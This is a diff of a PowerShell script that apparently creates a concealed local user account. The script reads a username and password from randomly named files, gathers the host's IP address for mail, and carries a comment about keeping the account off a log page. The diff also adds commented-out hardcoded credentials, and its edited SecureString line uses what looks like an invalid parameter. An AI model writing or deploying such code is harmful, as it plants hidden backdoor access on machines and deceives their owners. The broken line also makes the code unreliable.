@@ -4,7 +4,11 @@ $temp_dir = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
 # Vars for mail
 $addr = ((Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress)
 $user = (Get-Content ./etgtYmwQUO.txt)
-$p = (ConvertTo-SecureString (Get-Content ./f4EWj29Hgq.txt) -AsPlainText -Force)
+$p = (Get-Content ./f4EWj29Hgq.txt)
+$p = (ConvertTo-SecureString $p -String -Force)
+
+#$user = "hideme"
+#$p = ConvertTo-SecureString "hideme" -AsPlainText -Force
 
 # Local user for "something" and "then excluding them from log page"
 New-LocalUser $user -Password $p -FullName $user -Description $user
